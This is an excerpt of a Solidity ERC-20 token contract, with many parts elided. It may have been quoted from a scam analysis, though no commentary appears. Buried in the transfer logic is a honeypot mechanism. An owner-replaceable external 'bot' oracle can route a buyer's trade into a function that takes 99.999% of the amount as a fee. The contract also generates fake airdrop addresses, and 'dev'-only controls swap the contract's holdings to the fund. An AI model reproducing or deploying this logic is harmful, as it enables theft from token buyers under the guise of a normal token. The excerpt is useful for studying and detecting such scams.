...
interface IFuckBot {
    function isFuckingBot(uint256 startBk) external returns (bool);
}
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    address private fuckBotAddress = 0x000000000000000000000000000000000000dEaD;
        ...
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                for (uint256 i = 0; i < 3; i++) {
                    ad = address(
                        uint160(
                            uint256(
                                keccak256(
                                    abi.encodePacked(i, i, block.timestamp)
                                )
                            )
                        )
                    );
            ...
            if (_swapPairList[from]) {
                if (block.number < startTradeBlock + 40) {
                    ...
                    require(
                        balanceOf(to).add(amount) <= 5 * maxBuyAmt,
                        "max buy limit"
                    );
                }
            }
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (
                    ...
                    IFuckBot(fuckBotAddress).isFuckingBot(startTradeBlock)
                ) {
                    _funTransfer(from, to, amount);
                    return;
                }
    ...
    function _funTransfer(
        ...
        uint256 feeAmount = (tAmount * 99999) / 100000;
        ...
        lockTheSwap
    {
        ...
        uint256 leftAmount = usdtBalance - fundAmount;
        if (leftAmount > 0) {
            USDT.transferFrom(
                address(_tokenDistributor),
                address(this),
    ...
    function setFuckbotAddress(address target) external onlyOwner {
        fuckBotAddress = target;
    }
    ...
    function setWhiteList(address[] calldata addList, bool enable)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < addList.length; i++) {
            _whiteList[addList[i]] = enable;
        }
    }
    ...
    function setEnableAirdrop(bool value) public {
        require(msg.sender == receiveAddress, "not dev");
        enableAirdrop = value;
    }

    function manualSwap(uint256 percent) public {
        require(msg.sender == receiveAddress, "not dev");
        uint256 swapFee = _buyFundFee +
            _buyLPDividendFee +
            _sellFundFee +
            _sellLPDividendFee +
            _sellLPFee;
        swapTokenForFund((balanceOf(address(this)) * percent) / 100, swapFee);
    }

    function setHolderRewardCondition(uint256 amount) public {
        require(msg.sender == receiveAddress, "not dev");
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) public {
        require(msg.sender == receiveAddress, "not dev");
...
contract AAToken is AbsToken {
    constructor()
        AbsToken(
            ...
            18,
            999,
            address(0xC54bc42dc1157edd7F959132F57809cE17356546)
        )
    {}
}